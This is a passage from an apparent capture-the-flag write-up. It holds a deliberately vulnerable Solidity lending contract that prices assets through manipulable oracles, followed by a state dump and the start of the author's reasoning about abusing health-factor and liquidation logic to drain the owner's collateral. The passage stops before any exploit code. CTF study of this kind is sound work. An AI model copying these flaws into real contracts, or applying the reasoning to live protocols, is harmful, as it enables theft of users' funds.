</span><span>        </span><span style=color:#a71d5d;font-weight:700>mapping</span><span>(</span><span style=color:#0086b3>uint256 </span><span style=color:#a71d5d;font-weight:700>=> </span><span style=color:#0086b3>uint256</span><span>) borrowed;
</span><span>        </span><span style=color:#a71d5d;font-weight:700>mapping</span><span>(</span><span style=color:#0086b3>uint256 </span><span style=color:#a71d5d;font-weight:700>=> </span><span style=color:#0086b3>uint256</span><span>) lastInterestBlock;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>mapping</span><span>(</span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>=> </span><span>UserAccount) userAccounts;
</span><span>    </span><span style=color:#a71d5d;font-weight:700>mapping</span><span>(</span><span style=color:#0086b3>uint256 </span><span style=color:#a71d5d;font-weight:700>=> </span><span>Asset) </span><span style=color:#a71d5d;font-weight:700>public</span><span> assets;
</span><span>    </span><span style=color:#0086b3>uint256 </span><span style=color:#a71d5d;font-weight:700>public</span><span> assetCount;
</span><span>    </span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>public</span><span> player;
</span><span>
</span><span>    </span><span style=color:#0086b3>uint256 </span><span style=color:#a71d5d;font-weight:700>public constant</span><span> LIQUIDATION_CLOSE_FACTOR </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>100</span><span>; </span><span style=color:#969896;font-style:italic>// 100% of the borrow can be liquidated
</span><span>    </span><span style=color:#0086b3>uint256 </span><span style=color:#a71d5d;font-weight:700>public constant</span><span> PRECISION </span><span style=color:#a71d5d;font-weight:700>=</span><span> 1e18;
</span><span>    </span><span style=color:#0086b3>uint256 </span><span style=color:#a71d5d;font-weight:700>public constant</span><span> MAX_LOOPS </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>10</span><span>;
</span><span>    </span><span style=color:#0086b3>uint256 </span><span style=color:#a71d5d;font-weight:700>public constant</span><span> BAD_DEBT_RATIO </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>110</span><span>;
</span><span>    </span><span style=color:#0086b3>uint256 </span><span style=color:#a71d5d;font-weight:700>public constant</span><span> MIN_HEALTH_FACTOR </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>1.05e18</span><span>;
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>mapping</span><span>(</span><span style=color:#0086b3>uint256 </span><span style=color:#a71d5d;font-weight:700>=> </span><span style=color:#0086b3>address</span><span>) </span><span style=color:#a71d5d;font-weight:700>public</span><span> priceOracles;
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>event </span><span style=color:#62a35c>AssetAdded</span><span>(</span><span style=color:#0086b3>uint256 </span><span style=color:#a71d5d;font-weight:700>indexed </span><span>assetId, </span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>indexed </span><span>token);
</span><span>    </span><span style=color:#a71d5d;font-weight:700>event </span><span style=color:#62a35c>Deposit</span><span>(</span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>indexed </span><span>user, </span><span style=color:#0086b3>uint256 </span><span style=color:#a71d5d;font-weight:700>indexed </span><span>assetId, </span><span style=color:#0086b3>uint256 </span><span>amount);
</span><span>    </span><span style=color:#a71d5d;font-weight:700>event </span><span style=color:#62a35c>Withdraw</span><span>(</span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>indexed </span><span>user, </span><span style=color:#0086b3>uint256 </span><span style=color:#a71d5d;font-weight:700>indexed </span><span>assetId, </span><span style=color:#0086b3>uint256 </span><span>amount);
</span><span>    </span><span style=color:#a71d5d;font-weight:700>event </span><span style=color:#62a35c>Borrow</span><span>(</span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>indexed </span><span>user, </span><span style=color:#0086b3>uint256 </span><span style=color:#a71d5d;font-weight:700>indexed </span><span>assetId, </span><span style=color:#0086b3>uint256 </span><span>amount);
</span><span>    </span><span style=color:#a71d5d;font-weight:700>event </span><span style=color:#62a35c>Repay</span><span>(</span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>indexed </span><span>user, </span><span style=color:#0086b3>uint256 </span><span style=color:#a71d5d;font-weight:700>indexed </span><span>assetId, </span><span style=color:#0086b3>uint256 </span><span>amount);
</span><span>    </span><span style=color:#a71d5d;font-weight:700>event </span><span style=color:#62a35c>Liquidate</span><span>(
</span><span>        </span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>indexed </span><span>liquidator,
</span><span>        </span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>indexed </span><span>borrower,
</span><span>        </span><span style=color:#0086b3>uint256 </span><span style=color:#a71d5d;font-weight:700>indexed </span><span>assetId,
</span><span>        </span><span style=color:#0086b3>uint256 </span><span>amount,
</span><span>        </span><span style=color:#0086b3>uint256 </span><span>collateralAssetId,
</span><span>        </span><span style=color:#0086b3>uint256 </span><span>collateralAmount
</span><span>    );
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>constructor</span><span>(</span><span style=color:#0086b3>address </span><span>_player) </span><span style=color:#62a35c>Ownable</span><span>() {
</span><span>        player </span><span style=color:#a71d5d;font-weight:700>=</span><span> _player;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>isSolved</span><span>() </span><span style=color:#a71d5d;font-weight:700>external view returns </span><span>(</span><span style=color:#0086b3>bool</span><span>) {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return</span><span> assets[0].token.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(player)) </span><span style=color:#a71d5d;font-weight:700>>= </span><span style=color:#0086b3>20000 ether</span><span>;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>getUserAccount</span><span>(</span><span style=color:#0086b3>address </span><span>user, </span><span style=color:#0086b3>uint256 </span><span>depositAssetId, </span><span style=color:#0086b3>uint256 </span><span>borrowAssetId, </span><span style=color:#0086b3>uint256 </span><span>interestAssetId) </span><span style=color:#a71d5d;font-weight:700>external view returns </span><span>(</span><span style=color:#0086b3>uint256</span><span>, </span><span style=color:#0086b3>uint256</span><span>, </span><span style=color:#0086b3>uint256</span><span>) {
</span><span>        UserAccount </span><span style=color:#a71d5d;font-weight:700>storage </span><span>account </span><span style=color:#a71d5d;font-weight:700>=</span><span> userAccounts[user];
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return </span><span>(account.deposited[depositAssetId], account.borrowed[borrowAssetId], account.lastInterestBlock[interestAssetId]);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>addAsset</span><span>(
</span><span>        </span><span style=color:#0086b3>address </span><span>_token,
</span><span>        </span><span style=color:#0086b3>uint256 </span><span>_baseRate
</span><span>    ) </span><span style=color:#a71d5d;font-weight:700>external onlyOwner </span><span>{
</span><span>        assets[assetCount] </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>Asset</span><span>({
</span><span>            token: </span><span style=color:#0086b3>IERC20</span><span>(_token),
</span><span>            totalDeposited: 0,
</span><span>            totalBorrowed: 0,
</span><span>            baseRate: _baseRate
</span><span>        });
</span><span>        </span><span style=color:#a71d5d;font-weight:700>emit </span><span style=color:#62a35c>AssetAdded</span><span>(assetCount, _token);
</span><span>        assetCount</span><span style=color:#a71d5d;font-weight:700>++</span><span>;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>setPriceOracle</span><span>(</span><span style=color:#0086b3>uint256 </span><span>_assetId, </span><span style=color:#0086b3>address </span><span>_priceOracle) </span><span style=color:#a71d5d;font-weight:700>external onlyOwner </span><span>{
</span><span>        priceOracles[_assetId] </span><span style=color:#a71d5d;font-weight:700>=</span><span> _priceOracle;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>deposit</span><span>(</span><span style=color:#0086b3>uint256 </span><span>_assetId, </span><span style=color:#0086b3>uint256 </span><span>_amount) </span><span style=color:#a71d5d;font-weight:700>external nonReentrant </span><span>{
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(_assetId </span><span style=color:#a71d5d;font-weight:700>&lt;</span><span> assetCount, </span><span style=color:#183691>"Invalid asset"</span><span>);
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(_amount </span><span style=color:#a71d5d;font-weight:700>></span><span> 0, </span><span style=color:#183691>"Amount must be greater than 0"</span><span>);
</span><span>
</span><span>        Asset </span><span style=color:#a71d5d;font-weight:700>storage </span><span>asset </span><span style=color:#a71d5d;font-weight:700>=</span><span> assets[_assetId];
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(asset.token.</span><span style=color:#62a35c>transferFrom</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>, </span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>), _amount), </span><span style=color:#183691>"Transfer failed"</span><span>);
</span><span>
</span><span>        </span><span style=color:#62a35c>updateInterest</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>, _assetId);
</span><span>        userAccounts[msg.sender].deposited[_assetId] </span><span style=color:#a71d5d;font-weight:700>+=</span><span> _amount;
</span><span>        asset.totalDeposited </span><span style=color:#a71d5d;font-weight:700>+=</span><span> _amount;
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>emit </span><span style=color:#62a35c>Deposit</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>, _assetId, _amount);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>borrow</span><span>(</span><span style=color:#0086b3>uint256 </span><span>_assetId, </span><span style=color:#0086b3>uint256 </span><span>_amount) </span><span style=color:#a71d5d;font-weight:700>external nonReentrant </span><span>{
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(_assetId </span><span style=color:#a71d5d;font-weight:700>&lt;</span><span> assetCount, </span><span style=color:#183691>"Invalid asset"</span><span>);
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(_amount </span><span style=color:#a71d5d;font-weight:700>></span><span> 0, </span><span style=color:#183691>"Amount must be greater than 0"</span><span>);
</span><span>
</span><span>        </span><span style=color:#62a35c>updateInterest</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>, _assetId);
</span><span>
</span><span>        UserAccount </span><span style=color:#a71d5d;font-weight:700>storage </span><span>account </span><span style=color:#a71d5d;font-weight:700>=</span><span> userAccounts[msg.sender];
</span><span>        Asset </span><span style=color:#a71d5d;font-weight:700>storage </span><span>asset </span><span style=color:#a71d5d;font-weight:700>=</span><span> assets[_assetId];
</span><span>
</span><span>        </span><span style=color:#0086b3>uint256</span><span> newBorrowAmount </span><span style=color:#a71d5d;font-weight:700>=</span><span> account.borrowed[_assetId] </span><span style=color:#a71d5d;font-weight:700>+</span><span> _amount;
</span><span>        account.borrowed[_assetId] </span><span style=color:#a71d5d;font-weight:700>=</span><span> newBorrowAmount;
</span><span>        asset.totalBorrowed </span><span style=color:#a71d5d;font-weight:700>+=</span><span> _amount;
</span><span>
</span><span>        </span><span style=color:#0086b3>uint256</span><span> healthFactor </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>calculateHealthFactor</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>);
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(healthFactor </span><span style=color:#a71d5d;font-weight:700>>=</span><span> MIN_HEALTH_FACTOR, </span><span style=color:#183691>"Borrow would result in undercollateralization"</span><span>);
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(asset.token.</span><span style=color:#62a35c>transfer</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>, _amount), </span><span style=color:#183691>"Transfer failed"</span><span>);
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>emit </span><span style=color:#62a35c>Borrow</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>, _assetId, _amount);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>liquidate</span><span>(</span><span style=color:#0086b3>address </span><span>_borrower, </span><span style=color:#0086b3>uint256 </span><span>_assetId, </span><span style=color:#0086b3>uint256 </span><span>_amount, </span><span style=color:#0086b3>uint256 </span><span>_collateralAssetId)
</span><span>        </span><span style=color:#a71d5d;font-weight:700>external
</span><span>        </span><span style=color:#a71d5d;font-weight:700>nonReentrant
</span><span>    {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(_assetId </span><span style=color:#a71d5d;font-weight:700>&lt;</span><span> assetCount </span><span style=color:#a71d5d;font-weight:700>&&</span><span> _collateralAssetId </span><span style=color:#a71d5d;font-weight:700>&lt;</span><span> assetCount, </span><span style=color:#183691>"Invalid asset"</span><span>);
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(_amount </span><span style=color:#a71d5d;font-weight:700>></span><span> 0, </span><span style=color:#183691>"Amount must be greater than 0"</span><span>);
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(_borrower </span><span style=color:#a71d5d;font-weight:700>!= msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>, </span><span style=color:#183691>"Cannot liquidate own position"</span><span>);
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(_assetId </span><span style=color:#a71d5d;font-weight:700>!=</span><span> _collateralAssetId, </span><span style=color:#183691>"Cannot liquidate same asset"</span><span>);
</span><span>
</span><span>        </span><span style=color:#62a35c>updateInterest</span><span>(_borrower, _assetId);
</span><span>        </span><span style=color:#62a35c>updateInterest</span><span>(_borrower, _collateralAssetId);
</span><span>
</span><span>        UserAccount </span><span style=color:#a71d5d;font-weight:700>storage </span><span>borrowerAccount </span><span style=color:#a71d5d;font-weight:700>=</span><span> userAccounts[_borrower];
</span><span>        Asset </span><span style=color:#a71d5d;font-weight:700>storage </span><span>borrowedAsset </span><span style=color:#a71d5d;font-weight:700>=</span><span> assets[_assetId];
</span><span>        Asset </span><span style=color:#a71d5d;font-weight:700>storage </span><span>collateralAsset </span><span style=color:#a71d5d;font-weight:700>=</span><span> assets[_collateralAssetId];
</span><span>
</span><span>        </span><span style=color:#0086b3>uint256</span><span> healthFactor </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>calculateHealthFactor</span><span>(_borrower);
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(healthFactor </span><span style=color:#a71d5d;font-weight:700>&lt;</span><span> PRECISION, </span><span style=color:#183691>"Account not liquidatable"</span><span>);
</span><span>
</span><span>        </span><span style=color:#0086b3>uint256</span><span> maxLiquidatable </span><span style=color:#a71d5d;font-weight:700>=</span><span> borrowerAccount.borrowed[_assetId] </span><span style=color:#a71d5d;font-weight:700>*</span><span> LIQUIDATION_CLOSE_FACTOR </span><span style=color:#a71d5d;font-weight:700>/ </span><span style=color:#0086b3>100</span><span>;
</span><span>        </span><span style=color:#0086b3>uint256</span><span> actualLiquidation </span><span style=color:#a71d5d;font-weight:700>=</span><span> Math.</span><span style=color:#62a35c>min</span><span>(_amount, maxLiquidatable);
</span><span>
</span><span>        </span><span style=color:#0086b3>uint256</span><span> realCollateralAmount </span><span style=color:#a71d5d;font-weight:700>=</span><span> actualLiquidation </span><span style=color:#a71d5d;font-weight:700>* </span><span style=color:#62a35c>getAssetPrice</span><span>(_assetId) </span><span style=color:#a71d5d;font-weight:700>/ </span><span style=color:#62a35c>getAssetPrice</span><span>(_collateralAssetId);
</span><span>        </span><span style=color:#0086b3>uint256</span><span> collateralAmount </span><span style=color:#a71d5d;font-weight:700>=</span><span> Math.</span><span style=color:#62a35c>min</span><span>(realCollateralAmount, borrowerAccount.deposited[_collateralAssetId]);
</span><span>
</span><span>        </span><span style=color:#0086b3>uint256</span><span> toLiquidate </span><span style=color:#a71d5d;font-weight:700>=</span><span> collateralAmount </span><span style=color:#a71d5d;font-weight:700>* </span><span style=color:#62a35c>getAssetPrice</span><span>(_collateralAssetId) </span><span style=color:#a71d5d;font-weight:700>/ </span><span style=color:#62a35c>getAssetPrice</span><span>(_assetId);
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(realCollateralAmount </span><span style=color:#a71d5d;font-weight:700>></span><span> borrowerAccount.deposited[_collateralAssetId]) {
</span><span>            toLiquidate </span><span style=color:#a71d5d;font-weight:700>=</span><span> toLiquidate </span><span style=color:#a71d5d;font-weight:700>*</span><span> BAD_DEBT_RATIO </span><span style=color:#a71d5d;font-weight:700>/ </span><span style=color:#0086b3>100</span><span>;
</span><span>        }
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(borrowedAsset.token.</span><span style=color:#62a35c>transferFrom</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>, </span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>), toLiquidate), </span><span style=color:#183691>"Transfer failed"</span><span>);
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(collateralAsset.token.</span><span style=color:#62a35c>transfer</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>, collateralAmount), </span><span style=color:#183691>"Transfer failed"</span><span>);
</span><span>
</span><span>        borrowerAccount.borrowed[_assetId] </span><span style=color:#a71d5d;font-weight:700>-=</span><span> actualLiquidation;
</span><span>        borrowerAccount.deposited[_collateralAssetId] </span><span style=color:#a71d5d;font-weight:700>-=</span><span> collateralAmount;
</span><span>
</span><span>        borrowedAsset.totalBorrowed </span><span style=color:#a71d5d;font-weight:700>-=</span><span> actualLiquidation;
</span><span>        collateralAsset.totalDeposited </span><span style=color:#a71d5d;font-weight:700>-=</span><span> collateralAmount;
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>emit </span><span style=color:#62a35c>Liquidate</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>, _borrower, _assetId, actualLiquidation, _collateralAssetId, collateralAmount);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>updateInterest</span><span>(</span><span style=color:#0086b3>address </span><span>_user, </span><span style=color:#0086b3>uint256 </span><span>_assetId) </span><span style=color:#a71d5d;font-weight:700>internal </span><span>{
</span><span>        UserAccount </span><span style=color:#a71d5d;font-weight:700>storage </span><span>account </span><span style=color:#a71d5d;font-weight:700>=</span><span> userAccounts[_user];
</span><span>        Asset </span><span style=color:#a71d5d;font-weight:700>storage </span><span>asset </span><span style=color:#a71d5d;font-weight:700>=</span><span> assets[_assetId];
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(account.lastInterestBlock[_assetId] </span><span style=color:#a71d5d;font-weight:700>== block</span><span>.</span><span style=color:#a71d5d;font-weight:700>number</span><span>) {
</span><span>            </span><span style=color:#a71d5d;font-weight:700>return</span><span>;
</span><span>        }
</span><span>
</span><span>        </span><span style=color:#0086b3>uint256</span><span> interestRate </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>getInterestRate</span><span>(_assetId);
</span><span>        </span><span style=color:#0086b3>uint256</span><span> blocksSinceLastUpdate </span><span style=color:#a71d5d;font-weight:700>= block</span><span>.</span><span style=color:#a71d5d;font-weight:700>number -</span><span> account.lastInterestBlock[_assetId];
</span><span>        </span><span style=color:#0086b3>uint256</span><span> interest </span><span style=color:#a71d5d;font-weight:700>=
</span><span>            account.borrowed[_assetId] </span><span style=color:#a71d5d;font-weight:700>*</span><span> interestRate </span><span style=color:#a71d5d;font-weight:700>*</span><span> blocksSinceLastUpdate </span><span style=color:#a71d5d;font-weight:700>/ </span><span>(</span><span style=color:#0086b3>365 days </span><span style=color:#a71d5d;font-weight:700>/ </span><span style=color:#0086b3>15</span><span>) </span><span style=color:#a71d5d;font-weight:700>/</span><span> PRECISION;
</span><span>        account.borrowed[_assetId] </span><span style=color:#a71d5d;font-weight:700>+=</span><span> interest;
</span><span>        asset.totalBorrowed </span><span style=color:#a71d5d;font-weight:700>+=</span><span> interest;
</span><span>        account.lastInterestBlock[_assetId] </span><span style=color:#a71d5d;font-weight:700>= block</span><span>.</span><span style=color:#a71d5d;font-weight:700>number</span><span>;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>getInterestRate</span><span>(</span><span style=color:#0086b3>uint256 </span><span>_assetId) </span><span style=color:#a71d5d;font-weight:700>public view returns </span><span>(</span><span style=color:#0086b3>uint256</span><span>) {
</span><span>        Asset </span><span style=color:#a71d5d;font-weight:700>storage </span><span>asset </span><span style=color:#a71d5d;font-weight:700>=</span><span> assets[_assetId];
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return</span><span> asset.baseRate;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>calculateHealthFactor</span><span>(</span><span style=color:#0086b3>address </span><span>_user) </span><span style=color:#a71d5d;font-weight:700>public view returns </span><span>(</span><span style=color:#0086b3>uint256</span><span>) {
</span><span>        </span><span style=color:#0086b3>uint256</span><span> totalCollateralInEth </span><span style=color:#a71d5d;font-weight:700>=</span><span> 0;
</span><span>        </span><span style=color:#0086b3>uint256</span><span> totalBorrowedInEth </span><span style=color:#a71d5d;font-weight:700>=</span><span> 0;
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>for </span><span>(</span><span style=color:#0086b3>uint256</span><span> i </span><span style=color:#a71d5d;font-weight:700>=</span><span> 0; i &lt; assetCount; i++) {
</span><span>            Asset </span><span style=color:#a71d5d;font-weight:700>storage </span><span>asset </span><span style=color:#a71d5d;font-weight:700>=</span><span> assets[i];
</span><span>            UserAccount </span><span style=color:#a71d5d;font-weight:700>storage </span><span>account </span><span style=color:#a71d5d;font-weight:700>=</span><span> userAccounts[_user];
</span><span>
</span><span>            </span><span style=color:#0086b3>uint256</span><span> collateralInEth </span><span style=color:#a71d5d;font-weight:700>=</span><span> account.deposited[i] </span><span style=color:#a71d5d;font-weight:700>* </span><span style=color:#62a35c>getAssetPrice</span><span>(i);
</span><span>            </span><span style=color:#0086b3>uint256</span><span> borrowedInEth </span><span style=color:#a71d5d;font-weight:700>=</span><span> account.borrowed[i] </span><span style=color:#a71d5d;font-weight:700>* </span><span style=color:#62a35c>getAssetPrice</span><span>(i);
</span><span>
</span><span>            totalCollateralInEth </span><span style=color:#a71d5d;font-weight:700>+=</span><span> collateralInEth;
</span><span>            totalBorrowedInEth </span><span style=color:#a71d5d;font-weight:700>+=</span><span> borrowedInEth;
</span><span>        }
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(totalBorrowedInEth </span><span style=color:#a71d5d;font-weight:700>==</span><span> 0) {
</span><span>            </span><span style=color:#a71d5d;font-weight:700>return type</span><span>(</span><span style=color:#0086b3>uint256</span><span>).</span><span style=color:#a71d5d;font-weight:700>max</span><span>;
</span><span>        }
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return</span><span> totalCollateralInEth </span><span style=color:#a71d5d;font-weight:700>*</span><span> PRECISION </span><span style=color:#a71d5d;font-weight:700>/</span><span> totalBorrowedInEth;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>getAssetPrice</span><span>(</span><span style=color:#0086b3>uint256 </span><span>_assetId) </span><span style=color:#a71d5d;font-weight:700>public view returns </span><span>(</span><span style=color:#0086b3>uint256</span><span>) {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(priceOracles[_assetId] </span><span style=color:#a71d5d;font-weight:700>== </span><span style=color:#0086b3>address</span><span>(0)) {
</span><span>            </span><span style=color:#a71d5d;font-weight:700>return</span><span> 0;
</span><span>        }
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return </span><span style=color:#62a35c>IPriceOracle</span><span>(priceOracles[_assetId]).</span><span style=color:#62a35c>getAssetPrice</span><span>(_assetId);
</span><span>    }
</span><span>}
</span></code></pre></div></div><h2 id=solution-4>Solution</h2><p>An interesting chall, we got a Lending protocol which uses two different price oracles to get the asset price.<p>Lets, observe the protocol first,<ol><li><p><strong>Oracle (Main Contract)</strong></p> <ul><li>A lending protocol that allows users to deposit and borrow assets<li>Manages multiple assets with their respective price oracles<li>Handles liquidations and interest calculations<li>Uses two price oracles to determine asset values for collateralization</ul><li><p><strong>SimplePriceOracle</strong></p> <ul><li>A basic price oracle that returns a fixed price<li>Has an owner who can set the price</ul><li><p><strong>CurvePriceOracle</strong></p> <ul><li>More sophisticated oracle that gets prices from a Curve pool<li>Validates price against an anchor value<li>Can get both oracle price and spot price from the Curve pool</ul></ol><p>The challenge involves manipulating these contracts to get <code>20,000 USDe</code> tokens when starting with <code>10,000</code> each of USDe and USDC. As usual let me see the initial state of this protocol,<pre class=language-bash data-lang=bash style=color:#323232;background-color:#fff><code class=language-bash data-lang=bash><span>  Player :  0xa7048127553Ead5D0408B3C8C068565d1cD46BDb
</span><span>  assetCount :  2
</span><span>  ---------------Asset0----------------
</span><span>  asset0 address:  0x21Bbb929210149d6a849caF486ee0263404056AD
</span><span>  asset0 totalDeposited0 :  10000000000000000000000
</span><span>  asset0 totalBorrowed0 :  0
</span><span>  asset0 baseRate0 :  1
</span><span>  asset0 priceOracle :  0xaabD0F52b2743ff3AF409f3f19f8626255961699
</span><span>  -----------------Asset1--------------
</span><span>  asset1 address:  0xA69af9EC4689Fad31B026c973eBf6Fc68F4c326d
</span><span>  asset1 totalDeposited1 :  10000000000
</span><span>  asset1 totalBorrowed1 :  18500000000
</span><span>  asset1 baseRate1 :  1
</span><span>  asset1 priceOracle :  0x9a99f79e1517c6ca48cA5B3A1994dB98CFECC29d
</span><span>  ---------------Owner-----------------
</span><span>  deposited0 :  10000000000000000000000
</span><span>  borrowed0 :  0
</span><span>  lastInterestedBlock0 :  3566869
</span><span>  deposited1 :  10000000000
</span><span>  borrowed1 :  18500000000
</span><span>  lastInterestedBlock1 :  3566869
</span><span>  asset0 balance :  0
</span><span>  asset1 balance :  18500000000
</span><span>
</span><span>  oracle asset0 balance :  90000000000000000000000
</span><span>  oracle asset1 balance :  71500000000
</span><span>  ---------------Player-----------------
</span><span>  deposited0 :  0
</span><span>  borrowed0 :  0
</span><span>  lastInterestedBlock0 :  0
</span><span>  deposited1 :  0
</span><span>  borrowed1 :  0
</span><span>  lastInterestedBlock1 :  0
</span><span>  asset0 balance :  10000000000000000000000
</span><span>  asset1 balance :  10000000000
</span><span>  -------------Price Oracles---------------
</span><span>  simplePriceOracle:  0xaabD0F52b2743ff3AF409f3f19f8626255961699
</span><span>  simplePriceOracle asset0 Price :  1000000
</span><span>  curvePriceOracle (asset 1)</span><span style=color:#62a35c>:</span><span>  0x9a99f79e1517c6ca48cA5B3A1994dB98CFECC29d
</span><span>  curvePriceOracle Curve Pool :  0x46206ede2b79e862D91BFa0CB4ce21EDFa7fC96f
</span><span>  Curve asset1 Price :  1000000000000000000
</span><span>  Curve SpotPrice :  1000000000000000000
</span><span>  -------------------------------------
</span><span>  token 0 in curve pool :  0x21Bbb929210149d6a849caF486ee0263404056AD
</span><span>  token 1 in curve pool :  0xA69af9EC4689Fad31B026c973eBf6Fc68F4c326d
</span></code></pre><p>Thats a lot of info but, I need at least this much to understood this protocol. So, looking at the initial state we can confirm that there are only two tokens in the lending Oracle contract and also the CurvePool oracle has also have the same tokens. As per the statement those two assets are <code>USDe</code> and <code>USDC</code> and we are given with <code>10000</code> amount of tokens each.<p>Can you guess? which one is the <code>USDe</code>? <code>asset0</code> or <code>asset1</code>?<blockquote><p>It's asset0, cause it has the decimals of 18. USDe is 18 decimals and USDC is 6.</blockquote><p>Owner has deposited <code>10000</code> of USDe, <code>10000</code> of USDC and borrowed <code>18500</code> of USDC.<p>What should we do?<ol><li>Can we directly <code>borrow()</code> <code>20000</code> USDe from the Oracle ? Yes If we have sufficient health factor.<li>Can we <code>liquidate()</code> owners collatoral and get all his collatoral asset ? Yes If can make owners health factor worse.</ol><p>Both of above options depends on the health factor, lets see how the health factor is calculated.<pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>calculateHealthFactor</span><span>(</span><span style=color:#0086b3>address </span><span>_user) </span><span style=color:#a71d5d;font-weight:700>public view returns </span><span>(</span><span style=color:#0086b3>uint256</span><span>) {
</span><span>    </span><span style=color:#0086b3>uint256</span><span> totalCollateralInEth </span><span style=color:#a71d5d;font-weight:700>=</span><span> 0;
